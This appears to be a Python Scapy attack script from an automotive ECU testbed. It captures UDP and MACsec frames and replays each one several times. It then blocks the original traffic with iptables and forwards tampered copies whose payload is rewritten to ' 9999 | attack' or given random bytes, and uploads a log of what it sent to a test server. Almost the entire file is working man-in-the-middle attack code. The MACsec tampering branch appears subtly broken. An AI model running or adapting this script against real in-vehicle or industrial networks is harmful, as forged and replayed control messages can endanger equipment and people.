from scapy.all import *
from scapy.contrib.macsec import MACsec
import time
import subprocess
import requests

conf.ipv6_enabled = False

ECU_ID = "mim2"
FILE_NAME = "/home/ftp_client/acpt/sent-" + ECU_ID + ".txt"
URL = "https://acpt.egle.cloud/php/upload-received.php"


def blockOriginal(iface, port):
    subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-m", "physdev", "--physdev-in", iface, "-p", "UDP", "--dport", port, "-j", "DROP"], check=True)

def resetOriginal(iface, port):
    subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-m", "physdev", "--physdev-in", iface, "-p", "UDP", "--dport", port, "-j", "DROP"], check=True)

def saveToFile(payload):
     with open(FILE_NAME, "a") as f:
        f.write(payload + "\n")

def sendFile():
    with open(FILE_NAME, "rb") as file:
        files = {"file": (FILE_NAME, file)}
        data = {"ecuId": ECU_ID}
        response = requests.post(URL, files=files, data=data)
        print(response.text)

def capturePacket(iface, filter):
    packet = sniff(iface=iface, filter=filter, count=1)
    if packet:
        return packet[0]
    return None

def modifyUDPPacket(packet, iface, content):
	payload = packet[UDP].payload.load.decode('utf-8')
	index = payload.find('=') + 1
	newContent = payload[:index] + content

	del packet[IP].len
	del packet[UDP].len
	del packet[IP].chksum
	del packet[UDP].chksum
		
	packet[UDP].payload = Raw(load=newContent.encode('utf-8'))
        
	packet = packet.__class__(bytes(packet))
	sendp(packet, iface=iface, verbose=False)
          
	print("Tampering output: ", packet[UDP].load.decode())
	saveToFile(packet[UDP].load.decode())
          
	return packet

def modifyMacsecPacket(packet, iface, content):
	payload = packet[MACsec].load
	randomBytes = bytes([random.randint(0, 255) for _ in range(2)])
	modifiedData = payload[:-2] + randomBytes
	
	newContent = modifiedData.hex()
	
	packet = Raw(load=newContent)
	packet = packet.__class__(bytes(packet))
	sendp(packet, iface=iface, verbose=False)
          
	print("Tampering output: ", newContent)
	saveToFile(newContent)
          
	return packet

def replayUDPPacket(packet, iface, times, delay):
    print("Replay target packet: ", packet[UDP].load.decode())
    for i in range (times):
        sendp(packet, iface=iface, verbose=False)
        print("Replay output: ", packet[UDP].load.decode())
        saveToFile(packet[UDP].load.decode())
        time.sleep(delay)
    print("Replay attack finished")

def replayMacsecPacket(packet, iface, times, delay):
    payload = extractPayload(packet[MACsec].load)
    print("Replay target packet: ", payload)
    for i in range (times):
        sendp(packet, iface=iface, verbose=False)
        print("Replay output: ", payload)
        saveToFile(payload)
        time.sleep(delay)
    print("Replay attack finished")

def extractPayload(data):
    start_pattern = b'[0'
    end_patterns = [b'ecu1', b'ecu2', b'ecu3', b'ecu4']
    start_index = data.find(start_pattern)
    if start_index == -1:
        return data.hex()

    for pattern in end_patterns:
        end_index = data.find(pattern, start_index)
        if end_index != -1:
            result = data[start_index:end_index + len(pattern)]
            try:
                return result.decode('ascii')
            except UnicodeDecodeError:
                return "Decoding error"
    return "End pattern not found"

def main():

    with open(FILE_NAME, "w") as f:
        pass

    filter = "(udp and dst host 10.0.0.194 and dst port 1111) or (ether proto 0x88E5 and ether dst 0c:42:28:71:00:00)"
    count = 0
    print("Attack started! Waiting for packets...")


    packet = capturePacket("ens4", filter)
    
    if packet:
        if packet.haslayer(UDP):
            replayUDPPacket(packet, "ens5", 5, 0.5)
        elif packet.type == 0x88E5:
            replayMacsecPacket(packet, "ens5", 5, 0.5)
    else:
        print("No packet captured")

    blockOriginal("ens4", "1111")
    try:
        while count <= 5:
            packet = capturePacket("ens4", filter)
            if packet:
                if packet.haslayer(UDP):
                    modifyUDPPacket(packet, "ens5", " 9999 | attack")
                    count += 1
                elif packet.type == 0x88E5:
                    modifyMacsecPacket(packet, "ens5", " 9999 | attack")
                    count += 1
            else:
                print("No packets captured")
                break
    finally:
        print("Tampering attack finished")
        resetOriginal("ens4", "1111")
    
    sendFile()

if __name__ == "__main__":
    main()
